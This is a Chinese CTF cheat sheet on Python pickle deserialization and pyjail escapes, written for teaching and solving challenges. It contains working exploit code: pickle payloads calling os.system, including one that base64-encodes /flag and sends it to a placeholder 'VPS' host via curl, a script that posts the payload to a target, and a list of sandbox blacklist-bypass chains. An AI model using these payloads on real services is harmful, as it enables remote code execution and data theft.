---
title: Python pickle 反序列化 & pyjail 逃逸
category: web
tags: [pickle, pyjail, 沙箱逃逸, __builtins__]
signals: [pickle.loads, 反序列化, python 沙箱, 禁用了 builtins, 只能输入字符, eval 黑名单, 不能使用下划线, jail, 逃逸]
difficulty: medium
source: "CTF-Wiki / 公开 writeup"
tools: [python, pickletools, pwntools]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 代码里有 `pickle.loads(request.data)`、`pickle.load(f)`。
- 题面说"一个 Python 沙箱"、"eval 里禁用了 `__import__`"、"不能有下划线"。
- 只允许输入字母数字，返回值被检查（`assert 'os' not in code`）。
- 提示：pyjail、sandbox、escape、jail、waf。
- 变体：`__builtins__` 被删，`open` 不可用，只能读书/写文件。
- 变体：输入被 `eval` 且 `__import__` 被替换成空函数。

## 二、原理

**pickle**：`pickle.loads` 会执行 `GLOBAL` 指令（`c module\nname\n`），把 `name` 取出后通过 `REDUCE`（`R`）调用。因此 `pickle.loads(b"cos\nsystem\n(S'id'\ntR.")` 等价于 `os.system('id')`。这是**设计特性**，不是 bug —— 所以 pickle 绝不能处理不可信数据。

**pyjail**：目标是拿到 `__builtins__` 里的 `open`/`__import__`。常见路径：

```
().__class__.__base__.__subclasses__()      # 遍历类
[].__class__.__base__.__subclasses__()[N]   # 找 subprocess.Popen / os._wrap_close
getattr(obj, '__globals__')                 # 取函数全局
```

常见禁元：
- 禁 `_` → 用 `getattr(x, chr(95)*2+'class'+chr(95)*2)` 或用 `%c`/unicode 转义。
- 禁 `[]` → 用 `__getitem__`。
- 禁 `os`/`system` → 用 `__import__('o'+'s')` 或 `importlib`。
- 禁数字 → 用 `True+True` 等。

## 三、解题步骤

1. **pickle 题**：直接用 `pickletools` 构造，或 `class` + `__reduce__` 生成。
2. **pyjail 题**：先看源码黑名单，再构造 `().__class__...` 链；被禁就逐字拆解。
3. 若 `__builtins__` 被清空：找 `warnings.catch_warnings` 的 `__init__.__globals__['__builtins__']`。
4. 拿到 `open`/`__import__` 后 `cat /flag` 或 `os.popen`。
5. 验证能否回显：无回显时把结果写文件再读，或用异常信息带出（`raise Exception(data)`）。

## 四、可直接运行的脚本

pickle 生成器（两种写法）：

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

data = pickle.dumps(Exploit())
print(repr(data))
# b'\x80\x04\x95...\x8c\x02os\x8c\x06system\x93\x8c\x02id\x85R.'

# 手工构造（不依赖类的字节，最通用）
from pickletools import optimize
payload = b"cos\nsystem\n(S'cat /flag'\ntR."
open("payload.bin", "wb").write(payload)

# 读文件回显版（用 builtins.eval 更灵活）
payload2 = b"cos\nsystem\n(S'curl http://VPS/$(cat /flag|base64)'\ntR."
```

提交到远端：

```python
import requests
r = requests.post("http://TARGET/api/load", data=open("payload.bin", "rb").read())
print(r.status_code, r.text[:200])
```

pyjail 逃逸链（按"禁了什么"挑选）：

```python
# 1) 基础：无过滤
().__class__.__base__.__subclasses__()[INDEX].__init__.__globals__['system']('id')

# 2) 找 os._wrap_close / subprocess.Popen 的下标（脚本自动找）
import builtins
subs = ().__class__.__base__.__subclasses__()
for i, c in enumerate(subs):
    if c.__name__ in ("_wrap_close", "Popen", "FileLoader"):
        print(i, c)

# 3) 禁 _：用 chr 拼
getattr(().__class__, chr(95)*2 + "base" + chr(95)*2)

# 4) 禁 []：用 __getitem__
().__class__.__base__.__subclasses__().__getitem__(INDEX)

# 5) 禁 import 关键字：用 __builtins__
__builtins__.__import__("os").system("id")

# 6) __builtins__ 被清空：走 warnings.catch_warnings
[w.__init__.__globals__["__builtins__"] for w in
 ().__class__.__base__.__subclasses__() if w.__name__ == "catch_warnings"][0]

# 7) 禁 os/system 字符串：拆字符串
__import__("o" + "s").system("tac /fl" + "ag")

# 8) 禁数字：
().__class__.__base__.__subclasses__().__getitem__(True + True + True)

# 9) 只能返回表达式、无赋值：用 lambda / 链式
(lambda: __import__("os").popen("cat /flag").read())()
```

完整可运行的本地 jail 测试：

```python
import subprocess, sys

JAIL = r'''
import re, sys
code = sys.stdin.read()
if re.search(r'__import__|open|eval|exec|os\.', code):
    print("BLOCKED"); sys.exit(1)
try:
    print("RESULT:", eval(code))       # 默认环境，有完整 builtins
except Exception as e:
    print("ERROR:", type(e).__name__, e)
'''

def run(code):
    p = subprocess.run([sys.executable, "-c", JAIL], input=code,
                       capture_output=True, text=True)
    return (p.stdout or p.stderr).strip()

# 直接触发黑名单
print(run("__import__('os').system('echo pwned')"))
# 绕过：不出现 __import__ / os. 字样，走 subclasses 动态找类
print(run("[c.__name__ for c in ().__class__.__base__.__subclasses__()][:5]"))
# 进一步：拼出 getattr 拿 __globals__
print(run("g=getattr(getattr((),chr(95)*2+'cl'+'ass'+chr(95)*2),'mro')()[1]"
          ".__subclasses__; g.__self__ if hasattr(g,'__self__') else 'ok'"))
```

> 若题目把 `__builtins__` 置空（第二个字典参数传入 `{"__builtins__": {}}`），上面第一行就不需要了 —— 直接从 `().__class__` 出发找 `_wrap_close` 类，它的 `__init__.__globals__` 里有完整的 `os` 与 `builtins`。

## 五、常见坑 / 变体

- **pickle 的协议版本**：`proto=0` 的字符串最可读；高版本用 `\x8c` 短字符串，注意 `\x80\x04` 前缀。
- **`pickle.loads` 的 `GLOBAL` 需要模块可导入**：`os`、`subprocess`、`builtins` 都行，`posix` 也行。
- **`__builtins__` 在 `exec` 里是 module，在 `eval` 里可能是 dict**：写脚本时两种都试。
- **`__subclasses__()` 的下标会变**：写死必错，务必动态搜索类名。
- **禁 `_` 时**：`chr(95)` 或 `'\x5f'` 或 `getattr(obj, '__cli'+'ent__')` 拼接。
- 变体：**`exec` 直接执行**（`exec("import os;os.system('id')")`）若没禁 `exec`，跳过所有花活。
- 变体：**`subprocess` 被禁但 `os` 可用**；**`open` 被禁但 `io.open` 可用**。
- 变体：**Jail + SSTI/F-string**：`f"{().__class__.__base__}"` 可以绕过普通字符串过滤。
- 变体：**`help()` 对象**（`help.__call__.__globals__`）在 `builtins` 被清空时仍可达。

## 六、参考来源

- [Python 官方文档 - pickle 安全性警告](https://docs.python.org/3/library/pickle.html)
- [CTF-Wiki Python 沙盒逃逸](https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/)
- [PayloadsAllTheThings - Python 反序列化](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [HackTricks - Python sandbox escape](https://book.hacktricks.wiki/en/network-services-pentesting/index.html)
